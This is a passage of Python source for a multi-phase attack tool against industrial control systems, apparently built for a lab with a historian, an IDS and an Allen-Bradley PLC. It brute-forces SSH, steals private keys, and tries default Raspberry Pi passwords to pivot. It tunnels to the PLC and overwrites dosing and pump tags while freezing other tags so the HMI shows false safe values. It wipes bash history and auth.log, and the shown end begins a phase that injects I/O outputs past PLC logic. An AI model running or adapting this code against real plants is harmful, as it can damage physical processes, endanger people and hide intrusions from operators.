        info(f"Wordlist: {wl}")

    found_pw = _ssh_bruteforce(ip=ip, port=port, username=user, wordlist_path=wl)

    if found_pw is not None:
        # ── ACCESS GRANTED panel ───────────────────────────────────────────────
        console.clear()
        console.print(Panel(
            f"\n[bold white]  ACCESS GRANTED  \n\n"
            f"  User  : [bold yellow]{user}[/bold yellow]\n"
            f"  Host  : [bold yellow]{ip}:{port}[/bold yellow]\n"
            f"  Pass  : [bold yellow]{found_pw}[/bold yellow]\n",
            title="[bold white] SSH COMPROMISED [/bold white]",
            border_style="bold green",
            expand=False,
            padding=(1, 4),
        ))
        r.status  = "success"
        r.finding = f"Credentials confirmed: {user}:{found_pw}"
        CFG["historian"]["password"] = found_pw
    else:
        r.status  = "failed"
        r.finding = f"No valid password found for {user}@{ip}"
        err(r.finding)

    r.output = r.finding
    return r


def phase4_ssh_pivot() -> PhaseResult:
    phase_header(4, "SSH into Historian → Hop to IDS — OT Zone Recon")
    r = PhaseResult("SSH Pivot / OT Recon")

    hist_ip   = CFG["historian"]["ip"]
    hist_user = CFG["historian"]["username"]
    hist_pass = CFG["historian"]["password"]
    hist_port = CFG["historian"]["port"]

    ids_ip    = CFG["ids"]["ip"]
    ids_user  = CFG["ids"]["username"]
    ids_pass  = CFG["ids"]["password"]
    ids_port  = CFG["ids"]["port"]

    plc_ip    = CFG["plc"]["ip"]
    findings  = []
    checks    = {"route": False, "ping": False, "syslog": False}

    PORT_VENDOR = {
        "44818": "Allen-Bradley / Rockwell (EtherNet/IP)",
        "102":   "Siemens S7 (ISO-TSAP)",
        "502":   "Modbus TCP Device",
    }
    SKIP_IPS = {ids_ip, "10.20.20.254"}

    try:
        # ── Step 1: land on Historian ────────────────────────────────────────
        info(f"Connecting to Historian ({hist_ip})...")
        hist_client = ssh_connect(hostname=hist_ip, username=hist_user,
                                  password=hist_pass, port=hist_port)

        # ── Step 2: OT syslog from Historian ────────────────────────────────
        console.print("\n[bold cyan]OT syslog (last 20 lines)[/bold cyan]")
        syslog_out, _, _ = ssh_run(hist_client, "grep '10.20.20' /var/log/syslog | tail -20")
        if syslog_out.strip():
            checks["syslog"] = True
            ok("OT zone syslog entries present")
        else:
            warn("No OT syslog entries — rsyslog forwarding may not be running")
        findings.append(f"Syslog:\n{syslog_out}")

        # ── Step 3: Confirm route to OT zone from Historian ─────────────────
        console.print("\n[bold cyan]Route: Historian → OT zone[/bold cyan]")
        route_out, _, route_rc = ssh_run(hist_client, f"ip route get {ids_ip}")
        if route_rc == 0:
            checks["route"] = True
            ok(f"Route to OT zone ({ids_ip}) exists from Historian")
        else:
            err(f"No route to OT zone from Historian — FortiGate may be blocking")
        findings.append(f"Route:\n{route_out}")

        # ── Step 4: Hop from Historian into IDS (10.20.20.5) ────────────────
        # The IDS lives inside the OT zone (10.20.20.x), so any probe it sends
        # to the PLC will carry a 10.20.20.5 source IP — which the PLC accepts.
        console.print("\n[bold cyan]Hopping Historian → IDS (OT zone)[/bold cyan]")
        info(f"Tunnelling SSH through Historian → {ids_user}@{ids_ip}:{ids_port}")

        # ── 4a. SSH Key Hunting — check Historian's own key first ───────────
        # A blind attacker who can't guess the IDS password can still pivot if
        # the Historian admin has a pre-authorised key pair trusted by the IDS.
        stolen_pkey: paramiko.PKey | None = None
        console.print("\n[bold cyan]SSH Key Hunt — searching Historian ~/.ssh/[/bold cyan]")
        key_out, _, key_rc = ssh_run(hist_client,
            "ls -la ~/.ssh/id_rsa 2>/dev/null && cat ~/.ssh/id_rsa 2>/dev/null || "
            "ls -la ~/.ssh/id_ed25519 2>/dev/null && cat ~/.ssh/id_ed25519 2>/dev/null || "
            "echo __NO_KEY__")

        if "-----BEGIN" in key_out:
            # Extract just the PEM block (everything from -----BEGIN to -----END)
            pem_lines = []
            in_block  = False
            for line in key_out.splitlines():
                if "-----BEGIN" in line:
                    in_block = True
                if in_block:
                    pem_lines.append(line)
                if "-----END" in line and in_block:
                    break
            pem = "\n".join(pem_lines) + "\n"

            try:
                # Try RSA first, then Ed25519
                try:
                    stolen_pkey = paramiko.RSAKey.from_private_key(io.StringIO(pem))
                except paramiko.SSHException:
                    stolen_pkey = paramiko.Ed25519Key.from_private_key(io.StringIO(pem))

                ok("[bold green][+] Stolen SSH Private Key found on Historian! "
                   "Attempting passwordless pivot...[/bold green]")
            except Exception as key_parse_err:
                warn(f"Key found but could not parse it: {key_parse_err}")
                stolen_pkey = None
        else:
            warn("No private key found on Historian — falling back to password list")

        # ── 4b. Attempt hop: stolen key first, then password fallbacks ───────
        IDS_FALLBACKS = [
            (ids_user, ids_pass),           # primary from CFG (tried first)
            ("pi",      "raspberry"),
            ("pi",      "admin123"),
            ("student", "student"),
            ("admin",   "raspberry"),
        ]

        ids_client = None
        last_exc: Exception | None = None

        # Try the stolen key against all plausible usernames before touching passwords
        if stolen_pkey:
            key_users = list(dict.fromkeys(
                [ids_user, "pi", "admin", "student", "kali"]
            ))
            for ku in key_users:
                try:
                    info(f"Trying stolen key as {ku}@{ids_ip}")
                    ids_client = ssh_hop(hist_client, ids_ip, ids_port,
                                         ku, pkey=stolen_pkey)
                    # Persist key + user in CFG so Phases 5 & 6 can reuse them
                    if ku != ids_user:
                        CFG["ids"]["username"] = ku
                    CFG["ids"]["password"]    = ""           # not needed — key auth
                    CFG["ids"]["private_key"] = stolen_pkey  # paramiko.PKey object
                    console.print(Panel(
                        f"[bold white]Method   :[/bold white] [bold green]Stolen SSH Private Key[/bold green]\n"
                        f"[bold white]Username :[/bold white] [bold yellow]{ku}[/bold yellow]\n"
                        f"[bold white]Host     :[/bold white] [bold yellow]{ids_ip}[/bold yellow]\n\n"
                        f"[dim]CFG updated — Phases 5 & 6 will use these credentials[/dim]",
                        title="[bold green] IDS PIVOTED VIA STOLEN KEY [/bold green]",
                        border_style="green",
                        expand=False,
                    ))
                    break
                except paramiko.AuthenticationException as exc:
                    warn(f"  Key rejected for {ku}@{ids_ip}")
                    last_exc = exc

        # If key auth didn't work (or no key), try password list
        if ids_client is None:
            for attempt_user, attempt_pass in IDS_FALLBACKS:
                try:
                    info(f"Trying IDS creds: {attempt_user}@{ids_ip}")
                    ids_client = ssh_hop(hist_client, ids_ip, ids_port,
                                         attempt_user, attempt_pass)
                    if attempt_user != ids_user or attempt_pass != ids_pass:
                        CFG["ids"]["username"] = attempt_user
                        CFG["ids"]["password"] = attempt_pass
                        console.print(Panel(
                            f"[bold white]Username :[/bold white] [bold yellow]{attempt_user}[/bold yellow]\n"
                            f"[bold white]Password :[/bold white] [bold yellow]{attempt_pass}[/bold yellow]\n\n"
                            f"[dim]CFG updated — Phases 5 & 6 will use these credentials[/dim]",
                            title="[bold yellow] IDS Credentials Auto-Corrected [/bold yellow]",
                            border_style="yellow",
                            expand=False,
                        ))
                    break
                except paramiko.AuthenticationException as exc:
                    warn(f"  Auth failed: {attempt_user}@{ids_ip}")
                    last_exc = exc

        if ids_client is None:
            raise last_exc  # bubble up so the outer except block catches it

        # ── Step 5: OT Fingerprinting Sweep — run FROM IDS ──────────────────
        # Source IP = 10.20.20.5 → PLC accepts the probe.
        console.print("\n[bold cyan]OT Fingerprinting Sweep (from IDS — OT zone source)[/bold cyan]")
        info("Probing ports 44818 (AB), 102 (Siemens), 502 (Modbus) across 10.20.20.1–254...")

        nc_check, _, nc_rc = ssh_run(ids_client, "which nc || which ncat || which netcat")
        has_nc = nc_rc == 0 and nc_check.strip()

        if has_nc:
            sweep_cmd = (
                "for i in {1..254}; do "
                "(for p in 102 502 44818; do "
                "nc -z -w 2 10.20.20.$i $p 2>/dev/null "
                "&& echo \"10.20.20.$i:$p\"; "
                "done) & "
                "done; wait"
            )
        else:
            warn("nc not found on IDS — using bash /dev/tcp fallback")
            sweep_cmd = (
                "for i in {1..254}; do "
                "(for p in 102 502 44818; do "
                "(bash -c \"echo > /dev/tcp/10.20.20.$i/$p\" 2>/dev/null "
                "&& echo \"10.20.20.$i:$p\"); "
                "done) & "
                "done; wait"
            )

        sweep_out, _, _ = ssh_run(ids_client, sweep_cmd, timeout=90)

        discovered_devices: list[dict] = []
        for line in sweep_out.splitlines():
            line = line.strip()
            if ":" not in line:
                continue
            parts = line.split(":")
            if len(parts) != 2:
                continue
            d_ip, d_port = parts[0].strip(), parts[1].strip()
            if not d_ip.startswith("10.20.20."):
                continue
            if d_ip in SKIP_IPS:
                continue
            vendor = PORT_VENDOR.get(d_port, f"Unknown (port {d_port})")
            discovered_devices.append({"ip": d_ip, "port": d_port, "vendor": vendor})

        sweep_table = Table(show_header=True, header_style="bold magenta", border_style="dim")
        sweep_table.add_column("Discovered IP",    style="cyan",  width=18)
        sweep_table.add_column("Open Port",         style="white", width=12)
        sweep_table.add_column("Inferred PLC Type", style="green", width=40)
        for dev in discovered_devices:
            sweep_table.add_row(dev["ip"], dev["port"], dev["vendor"])
        console.print(sweep_table)

        PORT_PRIORITY = ["44818", "502", "102"]

        # Prefer the already-configured IP if it showed up in the sweep —
        # only fall back to the first discovered device if ours is absent.
        configured_hits = [d for d in discovered_devices if d["ip"] == plc_ip]
        if configured_hits:
            # Pick the hit with the highest-priority port
            best = next(
                (h for pp in PORT_PRIORITY for h in configured_hits if h["port"] == pp),
                configured_hits[0],
            )
        else:
            best = None
            for preferred_port in PORT_PRIORITY:
                best = next((d for d in discovered_devices if d["port"] == preferred_port), None)
                if best:
                    break

        if best:
            old_plc_ip = plc_ip
            CFG["plc"]["ip"]   = best["ip"]
            CFG["plc"]["type"] = best["vendor"]
            plc_ip = best["ip"]
            checks["ping"] = True
            if best["ip"] != old_plc_ip:
                console.print(Panel(
                    f"[bold white]Configured IP :[/bold white]  "
                    f"[red]{old_plc_ip}[/red]  (not seen in sweep)\n"
                    f"[bold white]Discovered IP :[/bold white]  "
                    f"[bold green]{best['ip']}[/bold green]  port {best['port']}\n"
                    f"[bold white]Vendor        :[/bold white]  {best['vendor']}\n\n"
                    f"[dim]CFG updated — Phase 5 will CIP from IDS → {best['ip']}[/dim]",
                    title="[bold yellow] PLC IP AUTO-CORRECTED [/bold yellow]",
                    border_style="yellow", expand=False,
                ))
            else:
                ok(f"PLC confirmed: {best['ip']}  ({best['vendor']}  port {best['port']})")
        else:
            checks["ping"] = False
            err("No recognised industrial devices found on OT subnet (ports 44818/502/102 all closed)")

        findings.append(f"OT Sweep:\n{sweep_out}")

        # ── Anti-forensics: wipe bash history + auth.log on remote hosts ─────
        for af_client in (ids_client, hist_client):
            try:
                ssh_run(af_client,
                        "cat /dev/null > ~/.bash_history; "
                        "sudo truncate -s 0 /var/log/auth.log 2>/dev/null",
                        timeout=5)
            except Exception:
                pass

        ids_client.close()
        hist_client.close()

        if checks["route"] and checks["ping"]:
            r.status  = "success"
            r.finding = (
                f"OT zone confirmed — {plc_ip} "
                f"({CFG['plc'].get('type', 'unknown vendor')})"
            )
            ok(r.finding)
        elif not checks["ping"]:
            r.status  = "failed"
            r.finding = "No recognised industrial devices found on the OT subnet"
            err(r.finding)
        else:
            r.status  = "failed"
            r.finding = "No route from Historian to OT zone"
            err(r.finding)

        r.output = "\n".join(findings)

    except paramiko.AuthenticationException as e:
        r.status  = "failed"
        r.finding = f"SSH auth failed — {e} — check CFG credentials"
        err(r.finding)
    except Exception as e:
        r.status  = "failed"
        r.finding = str(e)
        err(str(e))

    return r


def _open_cip_tunnel(
    hist_ip: str, hist_user: str, hist_pass: str,
    ids_ip: str,  ids_user: str,  ids_pass: str,
    ids_pkey: "paramiko.PKey | None",
    plc_ip: str,  local_port: int = 44818,
) -> tuple["subprocess.Popen", "str | None"]:
    """
    Spawn a native ssh -L tunnel:  localhost:local_port → IDS → PLC:local_port
    Historian is the ProxyCommand jump host (sshpass for password auth).
    IDS auth uses the stolen private key when available, else sshpass password.

    Returns (Popen, key_file_path_or_None).
    Caller must .terminate() the process and delete the key file when done.
    """
    # Write stolen key to disk so ssh -i can use it
    key_file: str | None = None
    if ids_pkey:
        key_file = "/tmp/ids_rsa"
        with open(key_file, "w") as kf:
            ids_pkey.write_private_key(kf)
        os.chmod(key_file, 0o600)

    # Kill any stale listener from a previous run
    run_cmd(f"fuser -k {local_port}/tcp 2>/dev/null || true", capture=False)
    time.sleep(0.5)

    # Historian hop via ProxyCommand — always password-authed
    ssh_opts   = "-o StrictHostKeyChecking=no -o ConnectTimeout=10 -o BatchMode=no"
    proxy_cmd  = (
        f"sshpass -p '{hist_pass}' ssh -W %h:%p "
        f"{ssh_opts} {hist_user}@{hist_ip}"
    )
    fwd        = f"-N -L {local_port}:{plc_ip}:{local_port}"
    proxy_opt  = f'-o "ProxyCommand={proxy_cmd}"'

    if key_file:
        # Key auth to IDS — no outer sshpass needed
        cmd = (
            f"ssh {fwd} {ssh_opts} {proxy_opt} "
            f"-i {key_file} {ids_user}@{ids_ip}"
        )
    else:
        # Password auth to IDS
        cmd = (
            f"sshpass -p '{ids_pass}' ssh {fwd} {ssh_opts} {proxy_opt} "
            f"{ids_user}@{ids_ip}"
        )

    proc = subprocess.Popen(
        cmd, shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE,   # captured so we can report why it died
    )
    return proc, key_file


def phase5_plc_attack() -> PhaseResult:
    phase_header(6, "Interactive CIP Attack Console")
    r = PhaseResult("PLC CIP Write")

    plc_ip   = CFG["plc"]["ip"]

    hist_ip   = CFG["historian"]["ip"]
    hist_port = CFG["historian"]["port"]
    hist_user = CFG["historian"]["username"]
    hist_pass = CFG["historian"]["password"]

    ids_ip   = CFG["ids"]["ip"]
    ids_port = CFG["ids"]["port"]
    ids_user = CFG["ids"]["username"]
    ids_pass = CFG["ids"]["password"]
    ids_pkey: "paramiko.PKey | None" = CFG["ids"].get("private_key")

    LOCAL_PORT    = 44818
    INTERESTING   = {"dose", "rate", "pump", "speed", "flow", "setpoint", "cmd", "hz", "local:"}
    NUMERIC_TYPES = {"REAL", "DINT", "INT", "LINT", "SINT", "UDINT", "UINT"}
    CIP_SLOTS     = ["", "/0", "/1", "/2", "/3"]

    console.print(Panel(
        "[bold white]Target :[/bold white] [bold yellow]{}[/bold yellow]\n"
        "[dim]Establishing tunnel to initialize Interactive Attack Console...[/dim]".format(plc_ip),
        title="[bold red] PLC Attack Module [/bold red]",
        border_style="red", expand=False,
    ))

    tunnel_proc: "subprocess.Popen | None" = None
    key_file:    "str | None"              = None

    try:
        # ── Kill any ghost SSH proxy processes that could cause rate-limits ───
        run_cmd("pkill -f 'ssh -W' 2>/dev/null || true",          capture=False)
        run_cmd("pkill -f 'ssh -N -L 44818' 2>/dev/null || true", capture=False)

        # ── Spawn the real ssh -L tunnel ──────────────────────────────────────
        info(f"Opening ssh -L tunnel  127.0.0.1:{LOCAL_PORT} → {ids_ip} → {plc_ip}:{LOCAL_PORT}")
        tunnel_proc, key_file = _open_cip_tunnel(
            hist_ip, hist_user, hist_pass,
            ids_ip,  ids_user,  ids_pass, ids_pkey,
            plc_ip,  LOCAL_PORT,
        )

        info("Waiting 4 s for tunnel to establish...")
        time.sleep(4)

        if tunnel_proc.poll() is not None:
            stderr_out = tunnel_proc.stderr.read(2048).decode(errors="replace").strip()
            raise RuntimeError(
                f"ssh tunnel exited immediately (rc={tunnel_proc.returncode})\n{stderr_out}"
            )
        ok(f"Tunnel live  127.0.0.1:{LOCAL_PORT} → {plc_ip}")

        # ── Slot hunt: try CIP paths until one opens ──────────────────────────
        from pycomm3 import LogixDriver

        plc_conn    = None
        working_path = None
        for slot in CIP_SLOTS:
            path = f"127.0.0.1{slot}"
            info(f"Trying CIP path: {path!r}")
            drv = LogixDriver(path, init_info=False)
            try:
                drv.open()
                plc_conn     = drv
                working_path = path
                ok(f"PLC connected at {path!r}")
                break
            except Exception as slot_err:
                warn(f"  {path!r} → {slot_err}")
                try: drv.close()
                except Exception: pass

        if plc_conn is None:
            raise RuntimeError(
                f"All CIP slot paths failed — PLC at {plc_ip} not responding via tunnel.\n"
                "Verify the PLC is powered on and sshpass is installed on Kali."
            )

        # Single lock serialises all pycomm3 calls — the driver is not thread-safe.
        plc_lock = threading.Lock()

        try:
            # ── Tag enumeration (runs once, table reused in loop) ─────────────
            info("Enumerating PLC tag list...")
            all_tags = plc_conn.get_tag_list()

            def _tname(t) -> str:
                return t.get("tag_name", "") if isinstance(t, dict) else str(getattr(t, "tag_name", ""))
            def _ttype(t) -> str:
                dt = t.get("data_type", "Unknown") if isinstance(t, dict) else getattr(t, "data_type", "Unknown")
                if isinstance(dt, dict):
                    return str(dt.get("name", "STRUCT"))
                return str(dt)

            # No filtering — expose every tag for full manual control
            display_tags = all_tags
            ok(f"{len(display_tags)} tags loaded — all tags shown for manual inspection")

            def _render_tag_table():
                tbl = Table(
                    title="[bold magenta]PLC Data Table — All Tags[/bold magenta]",
                    show_header=True, header_style="bold cyan", border_style="dim",
                )
                tbl.add_column("#",         style="dim",    width=5,  justify="right")
                tbl.add_column("Tag Name",  style="green",  width=42)
                tbl.add_column("Data Type", style="yellow", width=12)
                for i, t in enumerate(display_tags, 1):
                    tbl.add_row(str(i), _tname(t), _ttype(t))
                console.print(tbl)

            # ── Live-fire shell — tunnel + connection stay open throughout ─────
            payloads_fired: list[str] = []

            def _cast(raw: str, reference, dtype: str = ""):
                """Cast raw string to the correct type for the selected tag."""
                # BOOL tag — accept True/False/1/0/yes/no
                if dtype.upper() == "BOOL" or isinstance(reference, bool):
                    return raw.strip().lower() in ("true", "1", "yes", "on")
                try:
                    if isinstance(reference, float): return float(raw)
                    if isinstance(reference, int):   return int(raw)
                except ValueError:
                    pass
                return raw

            quit_all   = False
            stop_freeze: threading.Event | None = None   # set when stealth mode active

            def _stop_stealth():
                """Signal the freeze thread to exit and wait briefly for it."""
                nonlocal stop_freeze
                if stop_freeze and not stop_freeze.is_set():
                    stop_freeze.set()
                    time.sleep(0.2)

            # ── OUTER LOOP: tag selection ─────────────────────────────────────
            while not quit_all:
                _render_tag_table()

                # ── HMI Stealth Mode prompt ───────────────────────────────────
                console.print()
                if Confirm.ask(
                    "[bold magenta]Enable HMI Stealth Mode? "
                    "[dim](freeze a tag at a safe value in the background)[/dim][/bold magenta]",
                    default=False,
                ):
                    _stop_stealth()   # kill any previous freeze thread first

                    freeze_raw = Prompt.ask(
                        f"[magenta]  Freeze tag # (1–{len(display_tags)})[/magenta]"
                    ).strip()
                    try:
                        freeze_tag = _tname(display_tags[int(freeze_raw) - 1])
                    except (ValueError, IndexError):
                        warn("Invalid index — stealth mode skipped")
                        freeze_tag = None

                    if freeze_tag:
                        with plc_lock:
                            freeze_cur = plc_conn.read(freeze_tag)
                        freeze_cur_val = freeze_cur.value if freeze_cur else 0
                        safe_raw = Prompt.ask(
                            f"[magenta]  Safe value to lock [bold]{freeze_tag}[/bold] at "
                            f"(current: [bold yellow]{freeze_cur_val}[/bold yellow])[/magenta]"
                        ).strip()
                        safe_value = _cast(safe_raw, freeze_cur_val)

                        stop_freeze = threading.Event()

                        def _freeze_loop(tag_name=freeze_tag, val=safe_value,
                                         ev=stop_freeze, lock=plc_lock):
                            while not ev.is_set():
                                try:
                                    with lock:
                                        plc_conn.write((tag_name, val))
                                except Exception:
                                    pass
                                time.sleep(random.uniform(0.003, 0.008))

                        t = threading.Thread(target=_freeze_loop, daemon=True)
                        t.start()
                        console.print(Panel(
                            f"[bold white]Frozen tag :[/bold white] [bold yellow]{freeze_tag}[/bold yellow]\n"
                            f"[bold white]Locked at  :[/bold white] [bold green]{safe_value}[/bold green]\n"
                            f"[bold white]Interval   :[/bold white] 3–8 ms (Randomized Jitter)\n\n"
                            f"[dim]HMI will display {safe_value} while you manipulate other tags[/dim]",
                            title="[bold magenta] HMI STEALTH MODE ACTIVE [/bold magenta]",
                            border_style="magenta", expand=False,
                        ))

                console.print(
                    f"[dim]  Select attack tag (1–{len(display_tags)})  |  [bold]q[/bold] = quit[/dim]"
                )
                console.print()
                raw_idx = Prompt.ask("[yellow]Tag #[/yellow]").strip().lower()

                if raw_idx in ("q", "quit"):
                    _stop_stealth()
                    quit_all = True
                    break

                try:
                    idx = int(raw_idx) - 1
                    if not (0 <= idx < len(display_tags)):
                        raise ValueError
                    selected_tag_obj = display_tags[idx]
                    tag   = _tname(selected_tag_obj)
                    dtype = _ttype(selected_tag_obj)
                except ValueError:
                    warn("Invalid selection — enter a number from the table or 'q' to quit")
                    continue

                CFG["plc"]["tag"] = tag
                is_bool = dtype.upper() == "BOOL"

                # ── INNER LOOP: continuous injection on same tag ──────────────
                while not quit_all:
                    with plc_lock:
                        cur_res = plc_conn.read(tag)
                    cur_val = cur_res.value if cur_res else "unknown"

                    console.print()
                    console.print(
                        f"[dim]  [bold]back[/bold] / [bold]b[/bold] = change tag  |  "
                        f"[bold]q[/bold] = quit[/dim]"
                    )

                    if is_bool:
                        prompt_hint = "[dim](BOOL — enter [bold]true[/bold]/[bold]false[/bold] or [bold]1[/bold]/[bold]0[/bold])[/dim]"
                    else:
                        prompt_hint = f"[dim](current: [bold yellow]{cur_val}[/bold yellow])[/dim]"

                    raw_val = Prompt.ask(
                        f"[red]  {tag}[/red] [{dtype}] "
                        f"{prompt_hint} "
                        f"[red]→ new value[/red]"
                    ).strip().lower()

                    if raw_val in ("q", "quit"):
                        _stop_stealth()
                        quit_all = True
                        break

                    if raw_val in ("b", "back"):
                        _stop_stealth()
                        break   # return to outer loop (re-prompts stealth mode)

                    inject_val = _cast(raw_val, cur_val, dtype)

                    with plc_lock:
                        before = plc_conn.read(tag)
                        plc_conn.write((tag, inject_val))
                        after  = plc_conn.read(tag)

                    info(f"  Before : {before.value}")
                    ok(f"  After  : [bold green]{after.value}[/bold green]")
                    payloads_fired.append(f"{tag}: {before.value} → {after.value}")

        finally:
            plc_conn.close()

        if payloads_fired:
            r.status  = "success"
            r.finding = "Payloads fired: " + " | ".join(payloads_fired)
            ok(r.finding)
        else:
            r.status  = "skipped"
            r.finding = "No payloads deployed"

        r.output = "\n".join(payloads_fired)

    except Exception as e:
        r.status  = "failed"
        r.finding = str(e)
        err(str(e))

    finally:
        if tunnel_proc and tunnel_proc.poll() is None:
            tunnel_proc.terminate()
            info("SSH tunnel closed")
        if key_file and os.path.exists(key_file):
            os.remove(key_file)
            info(f"Removed {key_file}")

    return r


def phase6_defense_check() -> PhaseResult:
    phase_header(6, "Defense Validation (Secure State)")
    r = PhaseResult("Defense Validation")

    hist_ip   = CFG["historian"]["ip"]
    hist_port = CFG["historian"]["port"]
    hist_user = CFG["historian"]["username"]
    hist_pass = CFG["historian"]["password"]

    ids_ip   = CFG["ids"]["ip"]
    ids_port = CFG["ids"]["port"]
    ids_user = CFG["ids"]["username"]
    ids_pass = CFG["ids"]["password"]
    ids_cmd  = "tail -50 /var/log/suricata/fast.log | grep -i 'cip\\|write\\|plc'"

    info(f"Checking Suricata alerts on IDS ({ids_ip}) via Historian hop...")

    try:
        hist_client = ssh_connect(hostname=hist_ip, username=hist_user,
                                  password=hist_pass, port=hist_port)
        ids_pkey    = CFG["ids"].get("private_key")   # set by Phase 4 if key was stolen
        ids_client  = ssh_hop(
            hist_client, ids_ip, ids_port, ids_user,
            target_pass=None if ids_pkey else ids_pass,
            pkey=ids_pkey,
        )

        stdout, _, _ = ssh_run(ids_client, ids_cmd)

        # ── Anti-forensics: wipe bash history + auth.log on remote hosts ─────
        for af_client in (ids_client, hist_client):
            try:
                ssh_run(af_client,
                        "cat /dev/null > ~/.bash_history; "
                        "sudo truncate -s 0 /var/log/auth.log 2>/dev/null",
                        timeout=5)
            except Exception:
                pass

        ids_client.close()
        hist_client.close()

        if stdout.strip():
            ok("Suricata CIP alert triggered:")
            console.print(f"[yellow]{escape(stdout)}[/yellow]")
            r.finding = "Suricata blocked CIP Write — Layer 1 defense confirmed"
            r.status  = "success"
        else:
            warn("No Suricata CIP alerts found — check rule deployment")
            r.finding = "No Suricata alerts detected"
            r.status  = "success"

        r.output = stdout

    except paramiko.AuthenticationException as e:
        r.status  = "failed"
        r.finding = f"SSH auth failed — {e}"
        err(r.finding)
    except Exception as e:
        r.status  = "failed"
        r.finding = str(e)
        err(str(e))

    return r


# ── Phase 5: CIP Enumerator ───────────────────────────────────────────────────

def phase5_cip_enum() -> PhaseResult:
    phase_header(5, "CIP Recon — PLC Memory Map")
    r = PhaseResult("CIP Enumerator")

    from pycomm3 import LogixDriver

    # ── Pull credentials from CFG (same pattern as phase5_plc_attack) ─────────
    plc_ip    = CFG["plc"]["ip"]

    hist_ip   = CFG["historian"]["ip"]
    hist_user = CFG["historian"]["username"]
    hist_pass = CFG["historian"]["password"]

    ids_ip    = CFG["ids"]["ip"]
    ids_user  = CFG["ids"]["username"]
    ids_pass  = CFG["ids"]["password"]
    ids_pkey  = CFG["ids"].get("private_key")

    LOCAL_PORT   = 44818
    CIP_SLOTS    = ["", "/0", "/1", "/2", "/3"]

    def _tname(t) -> str:
        return t.get("tag_name", "") if isinstance(t, dict) else str(getattr(t, "tag_name", ""))
    def _ttype(t) -> str:
        dt = t.get("data_type", "Unknown") if isinstance(t, dict) else getattr(t, "data_type", "Unknown")
        if isinstance(dt, dict):
            return str(dt.get("name", "STRUCT"))
        return str(dt)
    def _is_noise(name: str) -> bool:
        return (
            name.startswith("__")
            or "Program:" in name
            or "Routine:" in name
            or "Task:"    in name
            or "Trend:"   in name
        )

    tunnel_proc: "subprocess.Popen | None" = None
    key_file:    "str | None"              = None
    plc_conn                               = None

    try:
        # ── Spawn ssh -L tunnel ───────────────────────────────────────────────
        info(f"Opening ssh -L tunnel  127.0.0.1:{LOCAL_PORT} → {ids_ip} → {plc_ip}:{LOCAL_PORT}")
        tunnel_proc, key_file = _open_cip_tunnel(
            hist_ip, hist_user, hist_pass,
            ids_ip,  ids_user,  ids_pass, ids_pkey,
            plc_ip,  LOCAL_PORT,
        )

        info("Waiting 4 s for tunnel to stabilise...")
        time.sleep(4)

        if tunnel_proc.poll() is not None:
            stderr_out = tunnel_proc.stderr.read(2048).decode(errors="replace").strip()
            raise RuntimeError(
                f"SSH tunnel exited immediately (rc={tunnel_proc.returncode})\n{stderr_out}"
            )
        ok(f"Tunnel live  127.0.0.1:{LOCAL_PORT} → {plc_ip}")

        # ── Slot hunt ─────────────────────────────────────────────────────────
        working_path = None
        for slot in CIP_SLOTS:
            path = f"127.0.0.1{slot}"
            info(f"Trying CIP path: {path!r}")
            drv = LogixDriver(path, init_info=False)
            try:
                drv.open()
                plc_conn     = drv
                working_path = path
                ok(f"PLC connected at {path!r}")
                break
            except Exception as slot_err:
                warn(f"  {path!r} → {slot_err}")
                try: drv.close()
                except Exception: pass

        if plc_conn is None:
            raise RuntimeError(
                f"All CIP slot paths failed — PLC at {plc_ip} not responding via tunnel"
            )

        # ── Tag enumeration ───────────────────────────────────────────────────
        info("Pulling full tag list from PLC data table...")
        all_tags  = plc_conn.get_tag_list()
        user_tags = [t for t in all_tags if not _is_noise(_tname(t))]

        ok(
            f"{len(all_tags)} tags retrieved — "
            f"{len(all_tags) - len(user_tags)} system tags suppressed — "
            f"[bold]{len(user_tags)} user-defined tags remain[/bold]"
        )

        if not user_tags:
            r.status  = "failed"
            r.finding = "No user-defined tags found"
            err(r.finding)
            return r

        # ── Live reads ────────────────────────────────────────────────────────
        info("Reading live values from PLC...")
        tbl = Table(
            title="[bold magenta]Target Environment: PLC Memory Map[/bold magenta]",
            show_header=True, header_style="bold cyan",
            border_style="dim", show_lines=False, padding=(0, 1),
        )
        tbl.add_column("#",          style="dim",    width=5,  justify="right")
        tbl.add_column("Tag Name",   style="green",  width=42)
        tbl.add_column("Data Type",  style="yellow", width=14)
        tbl.add_column("Live Value", style="white",  width=22)

        reads_ok     = 0
        reads_denied = 0
        findings_log = []

        for i, tag in enumerate(user_tags, 1):
            name  = _tname(tag)
            dtype = _ttype(tag)
            try:
                result = plc_conn.read(name)
                if result is None or result.value is None:
                    value_str = "[dim]None[/dim]"
                else:
                    value_str = escape(str(result.value))
                    findings_log.append(f"{name} ({dtype}) = {result.value}")
                reads_ok += 1
            except Exception:
                value_str    = "[bold red]ACCESS DENIED[/bold red]"
                reads_denied += 1

            name_str  = str(escape(name))
            dtype_str = str(escape(dtype))
            tbl.add_row(str(i), name_str, dtype_str, value_str)

        console.print(tbl)
        console.print()
        console.print(Panel(
            f"[bold white]Tags read successfully :[/bold white] [green]{reads_ok}[/green]\n"
            f"[bold white]Access denied          :[/bold white] "
            + (f"[red]{reads_denied}[/red]" if reads_denied else "[dim]0[/dim]") +
            f"\n[bold white]Total user tags        :[/bold white] {len(user_tags)}",
            title="[bold cyan] Enumeration Summary [/bold cyan]",
            border_style="cyan", expand=False,
        ))

        r.status  = "success"
        r.finding = (
            f"{len(user_tags)} user tags enumerated — "
            f"{reads_ok} readable, {reads_denied} denied"
        )
        r.output  = "\n".join(findings_log)

    except Exception as e:
        r.status  = "failed"
        r.finding = str(e)
        err(str(e))
    finally:
        if plc_conn:
            try: plc_conn.close()
            except Exception: pass
        if tunnel_proc and tunnel_proc.poll() is None:
            tunnel_proc.terminate()
            info("SSH tunnel closed")
        if key_file and os.path.exists(key_file):
            os.remove(key_file)
            info(f"Removed {key_file}")

    return r


# ── Phase 8: Direct Remote I/O Injector ──────────────────────────────────────

def phase8_direct_io_inject() -> PhaseResult:
    phase_header(8, "Direct Remote I/O Injection (Bypass PLC Logic)")
    r = PhaseResult("Direct I/O Inject")

    from pycomm3 import LogixDriver, CommError

    plc_ip  = CFG["plc"]["ip"]
    LOCAL_PORT = 44818

    # ── Known Point I/O output tag candidates (1734-OE2C / similar) ──────────
    OUTPUT_TAGS = [
        "RemoteIO:4:O.Data[0]",
        "RemoteIO:4:O.Ch0_Output",
        "RemoteIO:3:O.Data[0]",
        "RemoteIO:3:O.Ch0_Output",
        "O.Data[0]",
        "Ch0_Output",
    ]

